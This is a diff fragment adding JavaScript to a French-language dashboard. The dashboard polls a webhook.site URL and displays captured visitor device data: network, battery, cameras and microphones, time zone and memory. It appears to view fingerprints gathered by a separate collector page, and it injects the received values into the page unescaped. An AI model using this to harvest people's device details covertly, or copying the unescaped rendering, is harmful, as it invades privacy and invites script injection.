+          ['Qualité', body.reseau?.qualite, 'accent'],
+          ['Débit', body.reseau?.debit],
+          ['Latence RTT', body.reseau?.latence],
+        ]
+      },
+      {
+        icon: '🔋', label: 'Batterie',
+        rows: [
+          ['Niveau', body.batterie?.level, body.batterie?.level && body.batterie.level !== 'N/A' ? 'accent' : ''],
+          ['En charge', body.batterie?.charging],
+        ]
+      },
+      {
+        icon: '🎛️', label: 'Périphériques',
+        rows: [
+          ['Caméras', body.peripheriques?.cameras],
+          ['Micros', body.peripheriques?.microphones],
+          ['Haut-parleurs', body.peripheriques?.speakers],
+        ]
+      },
+      {
+        icon: '🕐', label: 'Temps',
+        rows: [
+          ['Fuseau', body.temps?.fuseau],
+          ['UTC offset', body.temps?.offset_utc],
+        ]
+      },
+      {
+        icon: '⚡', label: 'Performance',
+        rows: [
+          ['Mémoire JS', body.performance?.memoire_js],
+        ]
+      },
+    ];
+
+    panel.innerHTML = sections.map(s => `
+      <div class="detail-section">
+        <div class="detail-section-header">
+          <span>${s.icon}</span>
+          <span>${s.label}</span>
+        </div>
+        <div class="detail-rows">
+          ${s.rows.filter(([,v]) => v != null && v !== 'N/A' && v !== undefined).map(([k,v,cls]) => `
+            <div class="detail-row">
+              <span class="detail-key">${k}</span>
+              <span class="detail-val ${cls||''}">${v ?? '—'}</span>
+            </div>
+          `).join('')}
+        </div>
+      </div>
+    `).join('');
+  }
+
+  async function loadWebhook() {
+    const url = document.getElementById('webhookInput').value.trim();
+    if (!url) return;
+
+    document.getElementById('loadingState')?.remove();
+    document.getElementById('entriesList').innerHTML = '<div id="loadingState"><div class="spinner"></div><div>CHARGEMENT...</div></div>';
+    document.getElementById('liveStatus').textContent = 'CHARGEMENT...';
+
+    try {
+      // Webhook.site API: GET /token/{uuid}/requests
+      const apiUrl = url.includes('/requests') ? url : url + '/requests';
+      const res = await fetch(apiUrl + '?per_page=100&page=1', {
+        headers: { 'Accept': 'application/json' }
+      });
+
+      if (!res.ok) throw new Error('HTTP ' + res.status);
+      const data = await res.json();
+      const entries = data.data || [];
+
+      allEntries = entries;
+      renderStats(entries);
+      renderList(entries);
+      showToast('✓ ' + entries.length + ' entrée(s) chargée(s)');
+      document.getElementById('liveStatus').textContent = 'EN DIRECT';
+    } catch(e) {
+      document.getElementById('entriesList').innerHTML = `
+        <div style="text-align:center;padding:40px;color:var(--accent2);font-size:10px;letter-spacing:0.1em">
+          ERREUR : ${e.message}<br><br>
+          <span style="color:var(--muted);font-size:9px">
+            Ouvrir webhook.site directement pour voir les requêtes.<br>
+            L'API webhook.site nécessite parfois un compte pour l'accès CORS.
+          </span>
+        </div>`;
+      document.getElementById('liveStatus').textContent = 'ERREUR';
+      showToast('✗ Erreur de chargement');
+    }
+  }
+
+  // Auto-refresh every 15s
+  loadWebhook();
+  setInterval(loadWebhook, 15000);
 </script>
 </body>
 </html>
